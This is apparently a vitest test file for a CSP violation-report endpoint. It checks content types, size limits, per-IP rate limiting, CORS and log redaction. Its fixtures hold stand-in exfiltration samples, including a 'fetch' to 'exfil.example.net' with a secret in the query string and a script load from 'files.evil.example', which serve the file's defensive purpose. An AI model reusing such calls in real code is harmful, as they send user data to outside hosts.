import { afterEach, describe, expect, it, vi } from 'vitest';
import { Hono } from 'hono';
import type { HonoEnv } from '../../env';
import { CSP_REPORT_MAX_BYTES, CSP_REPORT_RPM } from '../../application/runtime/cspReports';
import { CSP_REPORT_PATH } from '../../application/runtime/workerCsp';
import { resolveAllowedOrigin } from '../middleware/cors';
import { createCspReportRoutes } from './cspReportRoutes';

/** A TENANT_RATE_LIMITER whose DO answers like the real sliding window: allow up to `limit`. */
function limiterEnv() {
  const counts = new Map<string, number>();
  const keys: string[] = [];
  const namespace = {
    idFromName: (name: string) => name,
    get: (name: string) => ({
      fetch: async (req: Request) => {
        keys.push(name);
        const { limit } = (await req.json()) as { limit: number };
        const current = (counts.get(name) ?? 0) + 1;
        counts.set(name, current);
        return new Response(JSON.stringify({
          allowed: current <= limit, current, limit, resetAt: new Date(Date.now() + 30_000).toISOString(),
        }));
      },
    }),
  };
  return { env: { TENANT_RATE_LIMITER: namespace as unknown as DurableObjectNamespace }, keys };
}

function app() {
  const a = new Hono<HonoEnv>();
  a.route('/api/runtime/csp-report', createCspReportRoutes());
  return a;
}

const post = (body: string, contentType: string, env: object = {}, ip = '203.0.113.7') =>
  app().request('/api/runtime/csp-report', {
    method: 'POST',
    headers: { 'content-type': contentType, 'cf-connecting-ip': ip },
    body,
  }, env);

const LEGACY = JSON.stringify({
  'csp-report': {
    'document-uri': 'https://preview.builderforce.ai/__bfwc/process-worker.js?policy=abc.def',
    'blocked-uri': 'https://exfil.example.net/collect?secret=hunter2',
    'effective-directive': 'connect-src',
    'violated-directive': 'connect-src https://registry.npmjs.org',
    'script-sample': 'fetch("https://exfil.example.net")',
  },
});

const REPORTING_API = JSON.stringify([
  {
    type: 'csp-violation',
    url: 'https://preview.builderforce.ai/__bfwc/python-worker.js?policy=abc.def',
    body: {
      documentURL: 'https://preview.builderforce.ai/__bfwc/python-worker.js?policy=abc.def',
      blockedURL: 'https://files.evil.example/x.whl',
      effectiveDirective: 'script-src-elem',
      sample: 'secret',
    },
  },
  { type: 'deprecation', body: { id: 'x' } },
]);

describe('POST /api/runtime/csp-report', () => {
  afterEach(() => vi.restoreAllMocks());

  it('accepts application/csp-report and logs only host, directive and document path', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const res = await post(LEGACY, 'application/csp-report');
    expect(res.status).toBe(204);
    expect(warn).toHaveBeenCalledTimes(1);
    const logged = JSON.parse(String(warn.mock.calls[0]![0]));
    expect(logged).toEqual({
      event: 'runtime.csp.violation',
      blocked: 'exfil.example.net',
      directive: 'connect-src',
      documentPath: '/__bfwc/process-worker.js',
    });
    expect(String(warn.mock.calls[0]![0])).not.toMatch(/hunter2|policy=|fetch\(/);
  });

  it('accepts application/reports+json and ignores non-CSP reports in the batch', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const res = await post(REPORTING_API, 'application/reports+json');
    expect(res.status).toBe(204);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(JSON.parse(String(warn.mock.calls[0]![0]))).toEqual({
      event: 'runtime.csp.violation',
      blocked: 'files.evil.example',
      directive: 'script-src-elem',
      documentPath: '/__bfwc/python-worker.js',
    });
  });

  it('refuses other content types, malformed JSON and oversize bodies', async () => {
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    expect((await post(LEGACY, 'application/json')).status).toBe(415);
    expect((await post('{not json', 'application/csp-report')).status).toBe(400);
    const huge = JSON.stringify({ 'csp-report': { 'blocked-uri': 'x'.repeat(CSP_REPORT_MAX_BYTES + 1) } });
    expect((await post(huge, 'application/csp-report')).status).toBe(413);
  });

  it('rate-limits per client IP', async () => {
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    const { env, keys } = limiterEnv();
    for (let i = 0; i < CSP_REPORT_RPM; i += 1) {
      expect((await post(LEGACY, 'application/csp-report', env)).status).toBe(204);
    }
    const limited = await post(LEGACY, 'application/csp-report', env);
    expect(limited.status).toBe(429);
    expect(limited.headers.get('retry-after')).toBeTruthy();
    expect(keys.every((k) => k === 'csp-report:203.0.113.7')).toBe(true);
    // Another address has its own window.
    expect((await post(LEGACY, 'application/csp-report', env, '198.51.100.1')).status).toBe(204);
  });

  it('admits the preview origin\'s Reporting API preflight (report-to uploads are CORS)', () => {
    expect(resolveAllowedOrigin('https://preview.builderforce.ai', 'https://builderforce.ai', CSP_REPORT_PATH)).toBe('*');
  });
});
